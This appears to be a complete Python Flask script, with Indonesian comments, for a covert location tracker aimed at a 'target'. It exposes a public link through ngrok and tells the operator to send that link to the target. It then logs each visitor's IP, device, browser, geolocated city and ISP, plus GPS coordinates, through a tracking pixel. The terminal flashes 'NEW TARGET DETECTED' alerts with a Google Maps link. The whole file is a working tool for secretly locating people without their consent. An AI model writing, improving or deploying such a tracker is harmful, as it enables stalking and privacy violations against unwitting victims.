from flask import Flask, request, render_template, jsonify
import requests
import json
import os
import subprocess
import threading
import time
import datetime
import sys

app = Flask(__name__)

LOG_FILE = "logs.txt"
NGROK_PORT = 5000

# Buat file buat komunikasi antar thread
NOTIF_FILE = "notif.txt"

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_notification(data):
    """Tampilkan notifikasi di terminal dengan efek"""
    clear_screen()
    lokasi = data.get('lokasi', {})
    lat = lokasi.get('latitude', 0)
    lon = lokasi.get('longitude', 0)
    kota = lokasi.get('kota', 'Unknown')
    provinsi = lokasi.get('provinsi', 'Unknown')
    negara = lokasi.get('negara', 'Unknown')
    isp = lokasi.get('isp', 'Unknown')
    ip = data.get('ip', 'Unknown')
    ua = data.get('user_agent', 'Unknown')
    ts = data.get('timestamp', '')
    
    # Deteksi device dari user agent
    device = "PC"
    if 'Android' in ua:
        device = "📱 Android"
    elif 'iPhone' in ua or 'iPad' in ua:
        device = "📱 iOS"
    elif 'Windows' in ua:
        device = "💻 Windows"
    elif 'Linux' in ua:
        device = "🐧 Linux"
    elif 'Mac' in ua:
        device = "🍎 macOS"
    
    # Deteksi browser
    browser = "Unknown"
    if 'Chrome' in ua and 'Edg' not in ua:
        browser = "🌐 Chrome"
    elif 'Firefox' in ua:
        browser = "🦊 Firefox"
    elif 'Safari' in ua and 'Chrome' not in ua:
        browser = "🧭 Safari"
    elif 'Edg' in ua:
        browser = "🌐 Edge"
    
    gps_tag = "📍 GPS" if lokasi.get('akurasi') == 'GPS (sangat akurat)' else "🌐 IP"
    
    print("\n" + "="*70)
    print(f"  🔴🔴🔴 NEW TARGET DETECTED! 🔴🔴🔴")
    print("="*70)
    print(f"\n  {gps_tag} {device} | {browser}")
    print(f"  🕐 Waktu: {ts}")
    print(f"  🌏 IP: {ip}")
    print(f"  📍 Lokasi: {kota}, {provinsi}, {negara}")
    print(f"  🏢 ISP: {isp}")
    print(f"  🎯 Koordinat: {lat}, {lon}")
    
    if lat != 0 and lon != 0:
        print(f"\n  🗺️  GOOGLE MAPS:")
        print(f"  https://www.google.com/maps?q={lat},{lon}")
        
        # Tampilkan preview maps (ASCII sederhana)
        print("\n  📌 PETA PREVIEW:")
        print("  " + "-"*50)
        # Buat grid sederhana
        grid_size = 20
        center_x = grid_size // 2
        center_y = grid_size // 2
        for y in range(grid_size):
            line = "  "
            for x in range(grid_size):
                if x == center_x and y == center_y:
                    line += "🔴"
                elif x == center_x:
                    line += "│"
                elif y == center_y:
                    line += "─"
                else:
                    line += "·"
            print(line)
        print("  " + "-"*50)
        print("  🔴 = POSISI TARGET (perkiraan)")
    
    print("\n" + "="*70)
    print("  [*] Tekan CTRL+C untuk stop tracker")
    print("="*70 + "\n")
    
    # BIP suara biar keren
    if os.name == 'posix':
        os.system('echo -e "\a"')
        # Atau pake paplay kalo ada
        try:
            subprocess.run(['paplay', '/usr/share/sounds/freedesktop/stereo/complete.oga'], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

def monitor_log():
    """Monitor file log dan tampilkan notifikasi saat ada data baru"""
    last_size = 0
    if os.path.exists(LOG_FILE):
        last_size = os.path.getsize(LOG_FILE)
    
    while True:
        time.sleep(1)
        if os.path.exists(LOG_FILE):
            current_size = os.path.getsize(LOG_FILE)
            if current_size > last_size:
                # Ada data baru!
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    f.seek(last_size)
                    new_lines = f.readlines()
                    for line in new_lines:
                        if line.strip():
                            try:
                                data = json.loads(line)
                                # Cek kalau ini data dari target (bukan localhost)
                                ip = data.get('ip', '')
                                if ip and not ip.startswith('127.') and not ip.startswith('192.168.'):
                                    show_notification(data)
                                else:
                                    # Tetap tampilkan tapi kecil
                                    print(f"[*] Local access: {ip}")
                            except:
                                pass
                last_size = current_size

def get_public_ngrok_url():
    try:
        response = requests.get('http://localhost:4040/api/tunnels', timeout=3)
        data = response.json()
        for tunnel in data['tunnels']:
            if tunnel['proto'] == 'https':
                return tunnel['public_url']
        return None
    except:
        return None

def wait_for_ngrok(max_wait=30):
    print("[*] Menunggu ngrok siap...")
    for i in range(max_wait):
        url = get_public_ngrok_url()
        if url:
            print("\n" + "="*70)
            print(f"  ✅ LINK PUBLIK: {url}")
            print("="*70)
            print(f"  📤 Kirim link ini ke target:")
            print(f"  {url}")
            print("\n  📊 Lihat data: {url}/data?pass=tracker123")
            print("="*70 + "\n")
            return url
        time.sleep(1)
    print("[-] Ngrok gagal. Cek http://localhost:4040")
    return None

def start_ngrok():
    try:
        with open('ngrok.log', 'w') as f:
            subprocess.Popen(['ngrok', 'http', str(NGROK_PORT)], 
                           stdout=f, stderr=f)
        print("[+] Ngrok proses dimulai...")
        return True
    except Exception as e:
        print(f"[-] Gagal: {e}")
        return False

def get_location(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone', timeout=5)
        data = response.json()
        if data['status'] == 'success':
            return {
                'ip': ip,
                'negara': data.get('country', '-'),
                'provinsi': data.get('regionName', '-'),
                'kota': data.get('city', '-'),
                'latitude': data.get('lat', 0),
                'longitude': data.get('lon', 0),
                'isp': data.get('isp', '-'),
                'organisasi': data.get('org', '-'),
                'timezone': data.get('timezone', '-')
            }
        return None
    except:
        return None

def log_data(data):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(data, ensure_ascii=False) + '\n')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/track', methods=['GET'])
def track():
    client_ip = request.remote_addr
    forwarded_ip = request.headers.get('X-Forwarded-For')
    if forwarded_ip:
        client_ip = forwarded_ip.split(',')[0].strip()
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    
    location = get_location(client_ip)
    if location is None:
        location = {
            'ip': client_ip,
            'negara': 'Tidak diketahui',
            'provinsi': '-',
            'kota': '-',
            'latitude': 0,
            'longitude': 0,
            'isp': '-',
            'organisasi': '-',
            'timezone': '-'
        }
    
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    if lat and lon:
        try:
            location['latitude'] = float(lat)
            location['longitude'] = float(lon)
            location['akurasi'] = 'GPS (sangat akurat)'
        except:
            pass
    
    full_data = {
        'timestamp': datetime.datetime.now().isoformat(),
        'ip': client_ip,
        'lokasi': location,
        'user_agent': user_agent,
        'referer': referer
    }
    
    log_data(full_data)
    
    pixel = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02L\x01\x00;'
    return pixel, 200, {'Content-Type': 'image/gif', 'Cache-Control': 'no-cache'}

@app.route('/data', methods=['GET'])
def view_data():
    password = request.args.get('pass')
    if password != 'tracker123':
        return "Akses ditolak", 403
    
    if not os.path.exists(LOG_FILE):
        return "Belum ada data"
    
    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    
    data_list = [json.loads(line) for line in lines if line.strip()]
    return jsonify(data_list)

if __name__ == '__main__':
    print("\n" + "="*70)
    print("  🎯 TRACKER - REAL-TIME NOTIFICATION")
    print("="*70 + "\n")
    
    # Start ngrok
    if start_ngrok():
        time.sleep(3)
        public_url = wait_for_ngrok()
    
    # Start monitor thread
    monitor_thread = threading.Thread(target=monitor_log, daemon=True)
    monitor_thread.start()
    print("[*] Monitor real-time aktif!")
    print("[*] Setiap ada target klik, langsung muncul di sini!\n")
    
    # Jalankan Flask
    app.run(host='0.0.0.0', port=5000, debug=False)